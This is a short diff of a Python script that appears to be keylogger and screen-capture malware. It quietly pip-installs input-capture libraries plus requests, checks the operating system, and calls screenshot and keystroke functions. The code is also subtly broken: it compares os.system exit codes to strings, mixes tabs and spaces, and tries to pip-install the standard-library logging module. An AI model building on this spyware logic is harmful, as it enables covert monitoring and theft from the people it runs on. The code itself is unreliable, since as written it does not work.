@@ -8,18 +8,18 @@ from screenshotWindows import screenshotsWin
 
 # install packages
 def installSoft():
-    if platform.system() == "win32" or platform.system() == "Linux" or platform.system() == "darwin": 
-        if os.system('pip3 show autopy') == "autopy" and os.system('pip3 show pynput') == "pynput" and os.system('pip3 show logging') == "logging":
-            pass
-        else:
-            os.system('pip3 -q install autopy pynput logging --user; ')
+    if platform.system() == "Windows" or platform.system() == "Linux" or platform.system() == "darwin": 
+        if os.system('pip3 show autopy') == "Name: autopy" and os.system('pip3 show pynput') == "Name: pynput" and os.system('pip3 show logging') == "Name: logging" and os.system('pip3 show requests') == "Name: requests":
+			pass
+		else:
+            os.system('pip3 -q install autopy pynput logging requests --user; ')
     else:
         print("Not a valid OS")
         quit() 
 
 #checks what OS it is
 def OScheck():
-    if platform.system() == "win32":
+    if platform.system() == "Windows":
         installSoft() 
         screenshotsWin()
         keystrokes() 
